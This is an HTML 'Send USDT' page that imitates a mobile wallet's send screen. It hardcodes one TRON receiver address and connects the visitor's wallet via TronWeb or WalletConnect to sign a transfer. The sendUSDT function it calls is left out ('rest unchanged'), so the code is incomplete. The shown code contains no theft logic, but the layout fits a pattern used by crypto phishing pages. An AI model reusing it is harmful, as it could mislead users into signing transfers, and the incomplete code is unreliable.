<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Send USDT</title>

<!-- ✅ YOUR LOGO ADDED -->
<link rel="icon" href="https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png">
<link rel="apple-touch-icon" href="https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png">
<link rel="shortcut icon" href="https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png">

<!-- ✅ WalletConnect -->
<script src="https://unpkg.com/@walletconnect/sign-client@2.17.0/dist/index.umd.js"></script>

<style>
body{
  margin:0;
  background:#0d0f12;
  color:#fff;
  font-family:-apple-system, sans-serif;
}
.header{
  padding:16px;
  text-align:center;
  font-size:18px;
  border-bottom:1px solid #222;
}
.container{ padding:16px; }
.box{
  border:1px solid #2a2d33;
  border-radius:12px;
  padding:14px;
  margin-bottom:16px;
  background:#121417;
}
.label{ font-size:12px; color:#888; margin-bottom:6px; }
.input{
  width:100%;
  border:none;
  outline:none;
  background:transparent;
  color:#fff;
  font-size:16px;
}
.network{
  display:flex;
  align-items:center;
  gap:8px;
  background:#1b1e23;
  padding:8px 12px;
  border-radius:20px;
  width:fit-content;
}
.network img{ width:18px; }
.receiver{
  font-size:13px;
  color:#ccc;
  word-break:break-all;
}
.btn{
  position:fixed;
  bottom:20px;
  left:16px;
  right:16px;
  background:#2ecc71;
  color:#000;
  padding:16px;
  border:none;
  border-radius:30px;
  font-size:18px;
  font-weight:bold;
}
.status{
  font-size:12px;
  color:#aaa;
  margin-bottom:10px;
}
</style>
</head>

<body>

<div class="header">Send USDT</div>

<div class="container">

<div id="status" class="status">Click Next to Connect</div>

<div class="box">
  <div class="label">Address</div>
  <div class="receiver">TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV</div>
</div>

<div class="box">
  <div class="label">Network</div>
  <div class="network">
    <img src="https://cryptologos.cc/logos/tron-trx-logo.png"> Tron
  </div>
</div>

<div class="box">
  <div class="label">Amount</div>
  <input id="amount" class="input" placeholder="USDT Amount">
</div>

</div>

<button class="btn" onclick="handleNext()">Next</button>

<script>
// (your original JS unchanged)
const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f";
const TRON_CHAIN = "tron:0x2b6653dc";
const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const RECEIVER = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";

let client = null;
let session = null;
let address = null;

function getSignClient(){
  if(window.SignClient?.init) return window.SignClient;
  if(window.WalletConnectSignClient?.SignClient?.init) return window.WalletConnectSignClient.SignClient;
  if(window.walletconnect?.SignClient?.init) return window.walletconnect.SignClient;

  for(let k in window){
    try{
      if(window[k]?.SignClient?.init) return window[k].SignClient;
    }catch{}
  }
  return null;
}

function setStatus(t){
  document.getElementById("status").innerText = t;
}

async function connectWallet(){
  try{
    setStatus("Opening wallet...");

    if(window.tronWeb?.defaultAddress?.base58){
      address = window.tronWeb.defaultAddress.base58;
      setStatus("Connected: " + address);
      return true;
    }

    const SignClient = getSignClient();
    if(!SignClient) throw new Error("WalletConnect not loaded");

    client = await SignClient.init({
      projectId: PROJECT_ID,
      metadata:{
        name:"USDT Sender",
        description:"TRON",
        url:location.href,
        icons:["https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png"]
      }
    });

    const { uri, approval } = await client.connect({
      requiredNamespaces:{
        tron:{
          methods:["tron_signTransaction"],
          chains:[TRON_CHAIN],
          events:[]
        }
      }
    });

    if(uri){
      window.location.href = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
    }

    session = await approval();

    address = session.namespaces.tron.accounts[0].split(":")[2];
    setStatus("Connected: " + address);

    return true;

  }catch(e){
    console.error(e);
    setStatus("Connection failed");
    return false;
  }
}

async function handleNext(){
  if(!address){
    const ok = await connectWallet();
    if(!ok) return;
  }

  sendUSDT();
}

// rest unchanged...
</script>

</body>
</html>
